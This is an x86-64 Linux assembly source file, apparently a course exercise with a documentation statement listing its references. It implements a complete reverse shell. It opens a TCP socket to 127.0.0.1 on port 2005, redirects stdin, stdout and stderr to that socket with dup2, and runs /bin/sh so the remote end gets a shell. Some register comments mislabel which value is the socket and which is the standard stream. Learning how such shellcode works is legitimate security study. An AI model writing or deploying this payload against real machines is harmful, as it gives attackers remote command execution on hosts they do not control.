;Documentation Statement:
;	https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm - accessed Aug 26th, used to understand the different types of jump commands to use (je and jle) in order to understand how they worked and on what conditions they executed a jump
;	https://www.asciitohex.com/ accessed Aug 26th, used to convert between base 10 numbers and little endian hex for the IP address and Port number
;	http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ - accessed Aug 26th, used for all syscalls to know what variables needed to be loaded into what registers, and what the number of the syscall was
;	http://man7.org/linux/man-pages/index.html - accessed Aug 26th, used for all syscalls to learn what they did, what their returned on success/failure, and what arguments they take
;
section .data

filename: db "/bin/sh" ; filename to reference for opening up a shell


section .text

global _start

_start:
	call _start.open_socket
	call _start.redirect
	call _start.open_shell
	call _start.end

_start.open_socket: ;opens the socket and specifies the port and ip address to call

	push rbp
        mov rbp, rsp

	mov rax, 41	;moves number of socket syscall to rax	
	mov rdi, 2 	;AF_INET
	mov rsi, 1 	;SOC_STREAM
	mov rdx, 0	;protocal type (default 0)
	syscall		;executes syscall
	cmp rax, 0	;any return value below 0 is an error
	jle _start.badend	;exits cleanly if there is an error
	mov r8, rax	;stores fd of socket in r8
	
	;socaddr in structure
	mov qword [rsp-8], 0x0		;8 bytes of padding
	mov dword [rsp-12], 0x0100007f	;inet addr 127.0.0.1 (little endian)
	mov word [rsp-14], 0xd507	;port 2005 (little endian)
	mov byte [rsp-16], 0x02		;AF_INET
	sub rsp, 16			;moves stackpointer to point towards sockaddr_in struct

	;connects the socket to the given ip on the given ports
	mov rax, 42	;syscall of the connect
	mov rdi, r8 	;fd of socket
	mov rsi, rsp	;*uservaddr
	mov rdx, 16	;addrlen
	syscall		;executes syscall
	cmp rax, -1 	;any return value below 0 is an error
        je _start.badend	;cleanly exits if there is an error
	
	;call _start.redirect
	leave
	ret

_start.redirect: ;redirects stdin, stdout, and stderr to the socket connection
	
	push rbp
        mov rbp, rsp
	
	;stdin redirect
	mov rax, 33     	;syscall of the dup2
        mov rdi, r8     	;fd of stdin
        mov rsi, 0    		;fd of socket
	syscall         	;executes syscall
        cmp rax, -1      	;a return value of -1 is an error
        je _start.badend       	;cleanly exits if there is an error

	;stdout redirect
        mov rax, 33     	;syscall of dup2
        mov rdi, r8     	;fd of stdout
        mov rsi, 1    		;fd of socket
        syscall         	;executes syscall
        cmp rax, -1      	;a return value of -1 is an error
        je _start.badend       	;cleanly exits if there is an error

	;stderr redirect
        mov rax, 33     	;syscall of dup2
        mov rdi, r8     	;fd of stderr
        mov rsi, 2    		;fd of socket
        syscall         	;executes syscall
        cmp rax, -1      	;a return value of -1 is an error
        je _start.badend       	;cleanly exits if there is an error
	
	;call _start.open_shell
	leave
	ret

_start.open_shell: ;opens a shell for the remote to run
	
	push rbp
        mov rbp, rsp

	mov rax, 59		;syscall of execve
        mov rdi, filename	;shell
        lea rsi, [rsp+24]	;name of the file
        lea rdx, [rsp+40]	;name of environmental variables
        syscall			;executes the system call
	
	;call _start.end
	leave
	ret	

_start.end: ;for if the program can exit cleanly (no errors)

	;syscall to shutdown socket
	mov rax, 48     ;syscall of shutdown
        mov rdi, r8     ;fd of socket
        mov rsi, 2    ;SHUT_RDWR, shutdown disallowing further receptions and transmissions
	syscall		;executes syscall

	
	;end program syscall
	mov rax, 60 	;syscall of exit
	mov rdi, 0	;exit code (no errors)
	syscall		;executes syscall

_start.badend: ;for if the program errors out (failed socket connection, etc)

	;syscall to shutdown socket
        mov rax, 48     ;syscall of shutdown
        mov rdi, r8     ;fd of socket
        mov rsi, 2    ;SHUT_RDWR, shutdown disallowing further receptions and transmissions
        syscall         ;executes syscall


        ;end program syscall
        mov rax, 60     ;syscall of exit
        mov rdi, 1      ;exit code (error)
        syscall         ;executes syscall
